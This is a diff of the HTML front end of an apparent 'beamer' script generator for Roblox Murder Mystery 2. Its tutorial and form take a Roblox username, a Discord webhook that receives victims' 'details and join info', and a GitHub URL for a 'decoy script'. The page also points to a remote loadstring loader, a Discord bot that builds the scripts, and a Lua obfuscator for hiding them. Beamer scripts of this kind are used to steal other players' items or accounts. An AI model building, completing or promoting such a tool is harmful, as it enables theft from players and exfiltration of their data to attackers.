@@ -2,9 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Script Generator App</title>
-  <link rel="stylesheet" href="style.css"/>
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <div class="app">
@@ -13,12 +13,8 @@
     </header>
 
     <main>
-      <!-- Tutorial Section (initially hidden) -->
+      <!-- Tutorial Page (hidden by default) -->
       <section id="tutorialPage" class="hidden">
-        <h2>📘 Script Generator Tutorial</h2>
-        <p>Welcome! This is where we’ll explain how to use the app step-by-step.</p>
-        <button id="backBtn" class="back-btn">🔙 Back</button>
-
         <div class="tutorial-content">
           <h2>🌿 MM2 Beamer Script Setup</h2>
           <p>You can either manually enter your details or use our custom bot to generate your script automatically.</p>
@@ -40,30 +36,32 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/PRXJECT-DEV/GLOBAL-BO
             <li>Webhook: A valid Discord webhook URL — this is where details and join info will be sent.</li>
             <li>ScriptURL: A raw GitHub URL for the decoy script.</li>
           </ul>
-          <p>⚠️ Make sure the URL is in raw format (https://raw.githubusercontent.com/...) and does not contain a loadstring in the script if you took it from the web.</p>
+          <p>⚠️ Make sure the URL is in raw format (<code>https://raw.githubusercontent.com/...</code>) and does not contain a loadstring in the script if you took it from the web.</p>
 
           <h3>🤖 Or Use Our Bot (Easier)</h3>
           <p>Use the command:</p>
           <pre><code>/create_script</code></pre>
-          <p>in &lt;#1368630892032950354&gt; Our bot will automatically generate your custom script and send it to you via DM — both as text and a downloadable .lua file.</p>
-          <p>Both options work the same way. The only difference: our bot fills it out for you — faster and error-free.</p>
-          <p>If there’s any problems just @ Us or private DM with the problem <em>(Note : Our bot is not going to be on 24/7 but still @ us if it’s offline)</em></p>
+          <p>in <code>&lt;#1368630892032950354&gt;</code><br />Our bot will automatically generate your custom script and send it to you via DM — both as text and a downloadable .lua file.</p>
+          <p>Both options work the same way.<br />The only difference: our bot fills it out for you — faster and error-free.</p>
+          <p>If there’s any problems just @ Us or private DM with the problem <em>(Note: Our bot is not going to be on 24/7 but still @ us if it’s offline)</em></p>
 
           <h3>For our lua obfuscator we use this or you could use Moose ⚒️</h3>
           <p><a href="https://luaobfuscator.com/?" target="_blank" rel="noopener noreferrer">https://luaobfuscator.com/?</a></p>
+
+          <button id="backBtn" class="back-btn">🔙 Back</button>
         </div>
       </section>
 
-      <!-- Main form section -->
+      <!-- Main form -->
       <form id="scriptForm">
         <input type="text" id="username" placeholder="Roblox Username" required />
         <input type="url" id="github" placeholder="GitHub Raw URL" required />
         <input type="url" id="webhook" placeholder="Discord Webhook URL" required />
-
+        
         <div class="button-group">
-          <button type="submit" id="generateBtn">✨ Generate Script</button>
-          <button type="button" id="tutorialBtn">📘 Tutorial</button>
-          <a href="https://luaobfuscator.com/?" target="_blank" rel="noopener noreferrer" class="btn obfuscationBtn">⚒️ Obfuscation</a>
+          <button type="button" id="tutorialBtn">📚 Tutorial</button>
+          <button type="button" id="obfuscationBtn">⚒️ Obfuscation</button>
+          <button type="submit">✨ Generate Script</button>
         </div>
       </form>
 
